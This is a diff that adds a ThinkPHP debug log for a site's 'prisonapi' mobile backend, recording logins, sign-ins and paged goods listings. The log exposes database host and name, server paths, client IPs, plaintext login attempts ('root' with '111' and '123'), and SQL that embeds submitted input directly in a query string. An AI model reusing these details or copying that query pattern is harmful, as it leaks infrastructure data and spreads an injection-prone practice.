@@ -1,0 +1,856 @@
+[ 2017-08-03T04:41:06+08:00 ] 60.205.45.195 52.43.229.168 GET /
+[ log ] alroy.cn/ [运行时间：0.034990s][吞吐率：28.58req/s] [内存消耗：2,229.27kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'en-US,en,*;q=0.5',
+  'connection' => 'Close',
+  'host' => 'alroy.cn',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-08-03T05:53:28+08:00 ] 60.205.45.195 123.125.71.32 GET /
+[ log ] www.alroy.cn/ [运行时间：0.034305s][吞吐率：29.15req/s] [内存消耗：2,229.20kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'en,*',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-08-03T08:14:29+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/login
+[ log ] www.alroy.cn/prisonapi/index/login [运行时间：0.068680s][吞吐率：14.56req/s] [内存消耗：3,143.59kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '36',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'root',
+  'password' => '111',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->login[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.017145s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_suspect` [ RunTime:0.002915s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_suspect` WHERE  (  membername='root' ) LIMIT 1 [ RunTime:0.002442s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:14:32+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/login
+[ log ] www.alroy.cn/prisonapi/index/login [运行时间：0.054311s][吞吐率：18.41req/s] [内存消耗：3,143.59kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '36',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'root',
+  'password' => '123',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->login[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007081s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_suspect` [ RunTime:0.003112s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_suspect` WHERE  (  membername='root' ) LIMIT 1 [ RunTime:0.002626s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:14:32+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/sign_add
+[ log ] www.alroy.cn/prisonapi/index/sign_add [运行时间：0.062362s][吞吐率：16.04req/s] [内存消耗：3,144.31kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007436s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003371s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_sign` WHERE  `mid` = 29 ORDER BY Id desc LIMIT 1 [ RunTime:0.002722s ]
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004504s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] INSERT INTO `jy_sign` (`mid` , `state` , `pubdate` , `month`) VALUES (29 , 1 , '2017-08-03' , 8) [ RunTime:0.002345s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:14:34+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/sign_none_add
+[ log ] www.alroy.cn/prisonapi/index/sign_none_add [运行时间：0.056382s][吞吐率：17.74req/s] [内存消耗：3,139.53kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_none_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_none_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007169s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003137s ]
+[ sql ] [ SQL ] SELECT `pubdate` FROM `jy_sign` WHERE  (  mid=29 and state=1 ) [ RunTime:0.002746s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:14:40+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/userinfo
+[ log ] www.alroy.cn/prisonapi/index/userinfo [运行时间：0.056250s][吞吐率：17.78req/s] [内存消耗：3,145.30kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'userinfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->userinfo[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.008316s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_suspect` [ RunTime:0.002972s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_suspect` WHERE  `Id` = 29 LIMIT 1 [ RunTime:0.002476s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:19+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.053014s][吞吐率：18.86req/s] [内存消耗：3,142.35kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '1',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006265s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.003020s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 0,6 [ RunTime:0.002375s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:19+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.056613s][吞吐率：17.66req/s] [内存消耗：3,142.28kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '2',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006660s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.003000s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 6,6 [ RunTime:0.003394s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:21+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.056670s][吞吐率：17.65req/s] [内存消耗：3,142.34kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '3',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007176s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.002884s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 12,6 [ RunTime:0.002479s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:27+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/sign_add
+[ log ] www.alroy.cn/prisonapi/index/sign_add [运行时间：0.057534s][吞吐率：17.38req/s] [内存消耗：3,027.69kb] [文件加载：49]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.008281s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003499s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_sign` WHERE  `mid` = 29 ORDER BY Id desc LIMIT 1 [ RunTime:0.003032s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:29+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.058425s][吞吐率：17.12req/s] [内存消耗：3,142.35kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '1',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006506s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.002965s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 0,6 [ RunTime:0.002350s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:29+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.057782s][吞吐率：17.31req/s] [内存消耗：3,142.28kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '2',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007383s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.002890s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 6,6 [ RunTime:0.003554s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:30+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/sign_add
+[ log ] www.alroy.cn/prisonapi/index/sign_add [运行时间：0.061238s][吞吐率：16.33req/s] [内存消耗：3,027.69kb] [文件加载：49]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.008796s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003437s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_sign` WHERE  `mid` = 29 ORDER BY Id desc LIMIT 1 [ RunTime:0.002742s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:32+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.059935s][吞吐率：16.68req/s] [内存消耗：3,142.35kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '1',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007731s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.003308s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 0,6 [ RunTime:0.002850s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:32+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.054906s][吞吐率：18.21req/s] [内存消耗：3,142.28kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '2',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006397s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.004099s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 6,6 [ RunTime:0.002240s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:34+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.057661s][吞吐率：17.34req/s] [内存消耗：3,142.35kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '1',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007492s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.003651s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 0,6 [ RunTime:0.002703s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:34+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.057888s][吞吐率：17.27req/s] [内存消耗：3,142.28kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '2',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007417s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.002787s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 6,6 [ RunTime:0.002398s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:34+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/sign_add
+[ log ] www.alroy.cn/prisonapi/index/sign_add [运行时间：0.055731s][吞吐率：17.94req/s] [内存消耗：3,027.69kb] [文件加载：49]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007046s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.002942s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_sign` WHERE  `mid` = 29 ORDER BY Id desc LIMIT 1 [ RunTime:0.002324s ]
+
+---------------------------------------------------------------
+[ 2017-08-03T08:16:35+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/sign_add
+[ log ] www.alroy.cn/prisonapi/index/sign_add [运行时间：0.059924s][吞吐率：16.69req/s] [内存消耗：3,027.69kb] [文件加载：49]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006973s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
